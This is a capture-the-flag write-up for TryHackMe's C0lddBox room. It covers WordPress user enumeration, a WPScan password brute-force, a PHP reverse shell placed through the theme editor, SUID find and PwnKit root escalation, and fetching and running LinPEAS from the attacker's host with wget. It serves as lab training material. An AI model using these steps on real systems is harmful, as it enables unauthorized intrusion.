# C0lddBox — TryHackMe Writeup

> **Platform:** TryHackMe  
> **Room:** C0lddBox  
> **Difficulty:** Beginner  
> **Objective:** Obtain the user and root flags.

---

## 1. Reconnaissance

### Nmap Scan

The first step was to enumerate the target and identify exposed services.

```bash
nmap -sCV -p- <TARGET_IP> --min-rate=3000 -o c0lddbox
```

The scan revealed:

- **80/tcp** — HTTP, Apache 2.4.18, WordPress 4.1.31
- **4512/tcp** — SSH, OpenSSH 7.2p2

![Nmap scan](images/01-nmap-scan.png)

---

## 2. Web Enumeration

### Directory Fuzzing

Next, I used Gobuster to enumerate directories on the web server.

![Gobuster directory enumeration](images/02-gobuster.png)

The scan led to a `/hidden` directory.

![Hidden directory](images/03-hidden-directory.png)

### WordPress Enumeration

The site was running WordPress, so I checked the WordPress administrative area and attempted to identify valid usernames.

![WordPress admin page](images/04-wp-admin.png)

Three valid usernames were identified:

- `C0ldd`
- `Hugo`
- `Philip`

![C0ldd username](images/05-user-c0ldd.png)

![Hugo username](images/06-user-hugo.png)

![Philip username](images/07-user-philip.png)

---

## 3. WordPress Credential Attack

I placed the discovered usernames into a file named `wpusers.txt` and used WPScan to perform a password attack against the WordPress login.

```bash
wpscan --url http://<TARGET_IP>/wp-login.php   -U wpusers.txt   -P /usr/share/wordlists/rockyou.txt   -t 50
```

![WPScan command](images/08-wpscan-command.png)

WPScan identified valid credentials. The password has been **redacted** from the screenshot for publication.

![WPScan results — password redacted](images/09-wpscan-results-redacted.png)

---

## 4. WordPress Access

Using the discovered credentials, I logged into the WordPress dashboard.

The installation was an older version of WordPress, and the account had access to the theme editor.

![WordPress login](images/10-wordpress-login.png)

![WordPress theme editor](images/11-wordpress-editor.png)

---

## 5. Initial Access — Reverse Shell

Because the WordPress account had access to edit PHP files, I used the theme editor to modify a PHP file and insert a PHP reverse shell.

I initially attempted to use `404.php`.

![Modified PHP file](images/12-reverse-shell-file.png)

I then started a listener on the same port.

![Reverse-shell listener](images/13-listener.png)

The modified PHP file could be accessed through the WordPress theme path:

```text
http://<TARGET_IP>/wp-content/themes/twentyfifteen/404.php
```

In my case, `404.php` did not work as expected, so I used `page.php` instead.

![Reverse shell](images/14-reverse-shell.png)

The reverse shell was successfully obtained.

---

## 6. Shell Stabilization

I stabilized the shell using a Python PTY.

![Shell stabilization](images/15-shell-stabilization.png)

I then moved to the user's home directory:

```bash
cd /home/c0ldd
```

The `local.txt` file was present, so we took the user flag from that file.

![Got user flag](images/16-user-flag-attempt.png)

---

## 7. Privilege Escalation via SUID

Since the user flag was inaccessible, I enumerated SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

![SUID enumeration](images/17-suid-enumeration.png)

Several SUID binaries were identified and checked for possible privilege-escalation paths.

![SUID binaries](images/18-suid-binaries.png)

The `find` binary turned out to be the useful one.

![GTFOBins — find](images/19-gtfobins-find.png)

Using the SUID `find` binary, I obtained a root shell.

At this point, root flag was accessible. **The flag values have been redacted from the screenshot for publication.**

![Flag — redacted](images/20-flags-redacted.png)

---

# Alternative Privilege Escalation Method

The machine also presented another route to root. Instead of exploiting the SUID `find` binary, I used LinPEAS to enumerate additional privilege-escalation vectors.

## 8. Transfer LinPEAS

I hosted `linpeas.sh` from the attacking machine using a Python HTTP server.

```bash
python3 -m http.server 80
```

![Python HTTP server](images/21-python-server.png)

![Python server running](images/22-python-server-running.png)

On the target machine, I moved to `/tmp` and downloaded the script:

```bash
cd /tmp
wget http://<VPN_IP>/linpeas.sh
```

![Downloading LinPEAS](images/23-wget-linpeas.png)

I then made the script executable and ran it:

```bash
chmod +x linpeas.sh
./linpeas.sh
```

![LinPEAS execution](images/24-linpeas-execution.png)

---

## 9. PwnKit

LinPEAS reported multiple potential privilege-escalation vectors, including older vulnerabilities such as Dirty COW and Dirty Pipe-style findings, as well as **PwnKit**.

For this route, I chose PwnKit.

![PwnKit detection](images/25-pwnkit-detection.png)

After transferring the PwnKit exploit to the target and executing it, I obtained a root shell again.

![Root shell via PwnKit](images/26-pwnkit-root.png)

---

## Conclusion

The C0lddBox machine can be completed through two privilege-escalation paths documented here:

1. **SUID `find`** — the primary route used in this writeup.
2. **PwnKit** — an alternative route identified with LinPEAS.

The WordPress foothold was obtained by enumerating valid usernames, brute-forcing the WordPress login, and abusing theme-editor access to execute a PHP reverse shell.

> **Note:** Credentials and flag values have been intentionally redacted from the published screenshots.
